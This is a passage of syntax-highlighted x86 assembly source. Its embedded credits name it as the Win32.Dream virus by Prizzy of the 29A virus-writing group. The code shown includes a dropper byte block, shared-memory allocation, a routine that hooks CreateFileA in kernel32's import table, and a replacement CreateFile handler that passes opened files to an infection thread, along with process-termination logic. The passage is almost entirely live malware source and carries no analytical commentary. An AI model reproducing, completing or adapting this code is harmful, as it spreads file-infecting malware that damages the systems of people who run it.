    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0EBh</span><span class="sc4">,</span><span class="sc2">28</span><span class="sc4">,</span><span class="sc2">0E8</span><span class="sc4">,</span><span class="sc2">1E</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">33</span><span class="sc4">,</span><span class="sc2">0C9</span><span class="sc4">,</span><span class="sc2">53</span><span class="sc4">,</span><span class="sc2">51</span><span class="sc4">,</span><span class="sc2">53</span><span class="sc4">,</span><span class="sc2">50</span><span class="sc4">,</span><span class="sc2">51</span><span class="sc4">,</span><span class="sc2">51</span><span class="sc4">,</span><span class="sc2">0B8</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">0D0</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0F7</span><span class="sc4">,</span><span class="sc2">0D0</span><span class="sc4">,</span><span class="sc2">89</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc2">6A</span><span class="sc4">,</span><span class="sc2">0A</span><span class="sc4">,</span><span class="sc2">0B8</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0FF</span><span class="sc4">,</span><span class="sc2">0D0h</span><span class="sc4">,</span><span class="sc2">0EBh</span><span class="sc4">,</span><span class="sc2">0CBh</span><span class="sc4">,</span><span class="sc2">0ADh</span><span class="sc4">,</span><span class="sc2">56</span><span class="sc4">,</span><span class="sc2">0EBh</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E8</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">41</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">33</span><span class="sc4">,</span><span class="sc2">0F6</span><span class="sc4">,</span><span class="sc2">0BF</span><span class="sc4">,</span><span class="sc2">1F</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0F</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">6A</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">57</span><span class="sc4">,</span><span class="sc2">0B8</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">0D0</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">56</span><span class="sc4">,</span><span class="sc2">56</span><span class="sc4">,</span><span class="sc2">56</span><span class="sc4">,</span><span class="sc2">57</span><span class="sc4">,</span><span class="sc2">50</span><span class="sc4">,</span><span class="sc2">0B9</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">0D1</span><span class="sc4">,</span><span class="sc2">0C3</span><span class="sc4">,</span><span class="sc5">E8</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">25</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0B0</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0A</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc2">0BEh</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc2">0B8</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc4">,</span><span class="sc2">96</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">50</span><span class="sc4">,</span><span class="sc2">69</span><span class="sc4">,</span><span class="sc2">65</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">47</span><span class="sc4">,</span><span class="sc2">44</span><span class="sc4">,</span><span class="sc2">49</span><span class="sc4">,</span><span class="sc2">33</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc4">,</span><span class="sc2">2E</span><span class="sc4">,</span><span class="sc2">64</span><span class="sc4">,</span><span class="sc2">6C</span><span class="sc4">,</span><span class="sc2">6C</span><span class="sc4">,</span><span class="sc2">0FF</span><span class="sc0">
   </span><span class="sc10">radix</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">

</span><span class="sc5">build_dropper</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">malloc</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">pusha</span><span class="sc0">                   </span><span class="sc1">;allocate shared memory</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">m_sign</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">m_sign</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"@"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">m_sign</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">lpCreateFileMappingA</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">m_failed</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">lpMapViewOfFile</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc5">m_failed</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">28</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">popa</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">malloc</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">hookapi</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">ha_module</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ha_failed</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">60</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'EP'</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ha_failed</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc5">fk32</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc12">'NREK'</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">fkok</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">20</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">fk32</span><span class="sc0">
   </span><span class="sc5">fkok</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">ha_failed</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc5">fklp</span><span class="sc4">:</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">ha_failed2</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc2">80h</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">finc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fnam</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"CreateFileA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">fnam</span><span class="sc4">:</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc7">fcom</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">12</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">repe</span><span class="sc0">    </span><span class="sc6">cmpsb</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">fapi</span><span class="sc0">
   </span><span class="sc5">finc</span><span class="sc4">:</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">fklp</span><span class="sc0">
   </span><span class="sc5">fapi</span><span class="sc4">:</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">cpm_shared_mem</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc5">vbody</span><span class="sc4">+</span><span class="sc5">newCreateFile</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc5">vbody</span><span class="sc4">+</span><span class="sc5">newCreateFile</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
   </span><span class="sc5">ha_failed2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc5">ha_failed</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__return</span><span class="sc0">
</span><span class="sc5">hookapi</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">" Win32.Dream, (c)oded by Prizzy/29A "</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">" The greetz go to all 29A vx coderz "</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">

</span><span class="sc5">newCreateFile</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">80h</span><span class="sc0">
   </span><span class="sc5">oldCreateFile</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">pusha</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">cpm_shared_mem</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">vbody</span><span class="sc4">+</span><span class="sc5">vsize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc5">vsize</span><span class="sc4">+</span><span class="sc5">__return</span><span class="sc4">+</span><span class="sc2">11</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">],</span><span class="sc2">9090h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc5">ncfc</span><span class="sc4">:</span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ncfc</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">active</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">process</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;infect_file hProcess, ProcID</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">;active thread</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc2">1F0FFFh</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">lpOpenProcess</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">ncf_failed</span><span class="sc0">
   </span><span class="sc5">ncfw</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">40</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">lpWaitForSingleObject</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ncfw</span><span class="sc0">
   </span><span class="sc5">ncf_failed</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">popa</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">newCreateFile</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">start_thread</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">thread</span><span class="sc0">
    </span><span class="sc6">pusha</span><span class="sc0">                   </span><span class="sc1">;threads gdelta</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">80h</span><span class="sc0">             </span><span class="sc1">;Sleep function</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">thread</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">40</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc9">IFE</span><span class="sc0"> </span><span class="sc5">st_count</span><span class="sc0"> </span><span class="sc9">NE</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">if_shared_mem</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">80h</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc2">1F0FFFh</span><span class="sc0">
     </span><span class="sc5">if_parent</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">11</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">apiz</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;OpenProcess</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">11</span><span class="sc0">              </span><span class="sc1">;terminate all processes</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">paramz</span><span class="sc4">+(</span><span class="sc2">6</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">)*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ifex</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">apiz</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;CloseHandle</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc9">ELSE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">paramz</span><span class="sc4">+(</span><span class="sc2">6</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">)*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">    </span><span class="sc1">;terminate this process?</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc9">ENDIF</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">paramz</span><span class="sc4">+(</span><span class="sc2">7</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">)*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
